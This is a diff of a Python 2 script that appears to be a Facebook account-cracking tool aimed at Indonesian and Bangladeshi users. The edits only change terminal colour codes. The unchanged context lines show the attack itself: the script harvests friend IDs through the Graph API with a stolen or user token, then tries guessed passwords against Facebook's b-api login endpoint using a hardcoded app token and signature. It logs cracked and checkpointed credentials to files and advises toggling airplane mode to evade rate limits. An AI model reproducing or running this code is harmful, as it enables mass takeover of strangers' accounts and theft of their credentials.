@@ -83,7 +83,7 @@ def jalan(z):
         time.sleep(0.03)
 
 
-logo = ' \n\x1b[1;91m $$$$$$\\            $$\\   $$\\           $$\\       \n$$  __$$\\           $$ |  $$ |          $$ |      \n$$ /  \\__| $$$$$$\\  $$ |  $$ | $$$$$$$\\ $$ |  $$\\ \n$$ |      $$  __$$\\ $$$$$$$$ |$$  _____|$$ | $$  |\n\x1b[1;97m$$ |      $$ |  \\__|\\_____$$ |$$ /      $$$$$$  / \n$$ |  $$\\ $$ |            $$ |$$ |      $$  _$$<  \n\\$$$$$$  |$$ |            $$ |\\$$$$$$$\\ $$ | \\$$\\ \n \\______/ \\__|            \\__| \\_______|\\__|  \\__|    \x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mAuthor  \x1b[1;91m : \x1b[1;96mMuhammad Rizky  \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mRecode  \x1b[1;91m : \x1b[1;96mRoy Octa Firdaus    \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mFacebook \x1b[1;91m: \x1b[1;96mfacebook.com/JbFbOld'
+logo = ' \n\x1b[1;91m $$$$$$\\            $$\\   $$\\           $$\\       \n$$  __$$\\           $$ |  $$ |          $$ |      \n$$ /  \\__| $$$$$$\\  $$ |  $$ | $$$$$$$\\ $$ |  $$\\ \n$$ |      $$  __$$\\ $$$$$$$$ |$$  _____|$$ | $$  |\n\x1b[1;97m$$ |      $$ |  \\__|\\_____$$ |$$ /      $$$$$$  / \n$$ |  $$\\ $$ |            $$ |$$ |      $$  _$$<  \n\\$$$$$$  |$$ |            $$ |\\$$$$$$$\\ $$ | \\$$\\ \n \\______/ \\__|            \\__| \\_______|\\__|  \\__|    \x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;97mAuthor  \x1b[1;91m : \x1b[1;93mMuhammad Rizky  \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;97mRecode  \x1b[1;91m : \x1b[1;93mRoy Octa Firdaus    \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;97mFacebook \x1b[1;91m: \x1b[1;93mfacebook.com/JbFbOld'
 back = 0
 threads = []
 berhasil = []
@@ -325,17 +325,17 @@ def pilih_indo():
             print 50 * '\x1b[1;94m\xe2\x94\x80'
             print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
             print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
+            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
             try:
                 pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 sp = json.loads(pok.text)
-                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;93m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
+                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID publik/teman tidak ada !'
                 raw_input('\n\x1b[1;93m{\x1b[1;97m<Kembali>\x1b[1;93m}')
                 crack_indo()
             except requests.exceptions.ConnectionError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Tidak ada koneksi !'
                 keluar()
 
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
@@ -350,24 +350,24 @@ def pilih_indo():
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
                 print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mNama File\x1b[1;91m :\x1b[1;92m ')
+                idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama File\x1b[1;91m :\x1b[1;92m ')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada ! '
                 raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
             except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada !'
                 raw_input('\n\x1b[1;93m{\x1b[1;97m<Kembali>\x1b[1;93m}')
                 crack_indo()
 
         elif teak == '0' or teak == '00':
             menu()
         else:
-            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Dengan Benar !'
+            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Isi Dengan Benar !'
             pilih_indo()
-        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
         print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
         titik = ['.   ', '..  ', '... ']
         for o in titik:
@@ -375,7 +375,7 @@ def pilih_indo():
             sys.stdout.flush()
             time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;93m\x1b[1;97m\x1b[1;93mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;93m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -394,7 +394,7 @@ def pilih_indo():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             ko = json.load(data)
             if 'access_token' in ko:
-                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
@@ -403,7 +403,7 @@ def pilih_indo():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;93m} \x1b[1;93mCEKPOINT'
                 print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
                 print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
                 print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
@@ -416,7 +416,7 @@ def pilih_indo():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 ko = json.load(data)
                 if 'access_token' in ko:
-                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
@@ -438,7 +438,7 @@ def pilih_indo():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     ko = json.load(data)
                     if 'access_token' in ko:
-                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
@@ -460,7 +460,7 @@ def pilih_indo():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         ko = json.load(data)
                         if 'access_token' in ko:
-                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
@@ -482,7 +482,7 @@ def pilih_indo():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             ko = json.load(data)
                             if 'access_token' in ko:
-                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
@@ -504,7 +504,7 @@ def pilih_indo():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 ko = json.load(data)
                                 if 'access_token' in ko:
-                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                                     print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;92m' + bos6
@@ -526,7 +526,7 @@ def pilih_indo():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     ko = json.load(data)
                                     if 'access_token' in ko:
-                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                                         print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;92m' + bos7
@@ -548,7 +548,7 @@ def pilih_indo():
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         ko = json.load(data)
                                         if 'access_token' in ko:
-                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                                             print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos8
@@ -585,7 +585,7 @@ def crack_bangla():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Token invalid'
         os.system('rm -rf login.txt')
         time.sleep(1)
         keluar()
@@ -604,7 +604,7 @@ def crack_bangla():
 def pilih_bangla():
     teak = raw_input('\x1b[1;96m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
     if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Isi Yg Benar Sayang !'
         pilih_bangla()
     else:
         if teak == '1' or teak == '01':
@@ -624,13 +624,13 @@ def pilih_bangla():
             print 50 * '\x1b[1;94m\xe2\x94\x80'
             print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
             print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
+            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m ID Publik/Teman \x1b[1;91m:\x1b[1;93m ')
             try:
                 pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                 sp = json.loads(pok.text)
-                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
+                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m Nama \x1b[1;91m:\x1b[1;93m ' + sp['name']
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID publik/teman tidak ada !'
                 raw_input('\n\x1b[1;96m{\x1b[1;97m<Kembali>\x1b[1;96m}')
                 crack_bangla()
             except requests.exceptions.ConnectionError:
@@ -649,32 +649,32 @@ def pilih_bangla():
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
                 print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama File \x1b[1;91m:\x1b[1;92m ')
+                idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m Nama File \x1b[1;91m:\x1b[1;93m ')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada ! '
                 raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
             except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada !'
                 raw_input('\n\x1b[1;96m{\x1b[1;97m<Kembali>\x1b[1;96m}')
                 crack_bangla()
 
         elif teak == '0' or teak == '00':
             menu()
         else:
-            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang !'
+            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Isi Yg Benar Sayang !'
             pilih_bangla()
-        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Stop Tekan CTRL+Z'
+        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m Stop Tekan CTRL+Z'
         titik = ['.   ', '..  ', '... ']
         for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Crack Berjalan ' + o,
+            print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;92m Crack Berjalan ' + o,
             sys.stdout.flush()
             time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;96m\x1b[1;97m\x1b[1;96mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;96m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -693,7 +693,7 @@ def pilih_bangla():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             ko = json.load(data)
             if 'access_token' in ko:
-                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
+                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;92m} \x1b[1;92mBERHASIL'
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
@@ -702,10 +702,10 @@ def pilih_bangla():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos1
+                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/bangla.txt', 'a')
                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
@@ -724,10 +724,10 @@ def pilih_bangla():
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos2
+                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/bangla.txt', 'a')
                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
@@ -746,10 +746,10 @@ def pilih_bangla():
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
